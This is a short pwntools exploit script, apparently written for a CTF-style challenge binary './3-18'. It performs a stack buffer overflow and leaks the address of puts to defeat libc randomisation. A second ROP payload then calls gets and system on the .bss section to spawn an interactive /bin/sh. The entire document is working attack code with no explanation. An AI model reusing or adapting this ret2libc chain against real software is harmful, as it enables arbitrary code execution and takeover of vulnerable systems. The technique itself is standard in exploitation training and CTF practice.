from pwn import *
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
p=process("./3-18")
elf=ELF("./3-18")
bss=elf.bss();
offset=116
ret=0x080483ae
puts_got=0x804a018
puts_plt=0x8048410
main=0x08048607


libc_system=libc.symbols['system'];
libc_puts=libc.symbols['puts'];
libc_gets=libc.symbols['gets'];


payload="Y"*offset+p32(puts_plt)+p32(main)+p32(puts_got)
p.sendline(payload)
puts_addr=u32(p.recv()[0:4])

offset=puts_addr-libc_puts
sys_addr=libc_system+offset
gets_addr=libc_gets+offset
print hex(gets_addr)
payload2=p32(ret)*50+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)+p32(0xdeadbeef)
raw_input("pause");
p.sendline(payload2)
p.sendline("/bin/sh")
p.interactive();

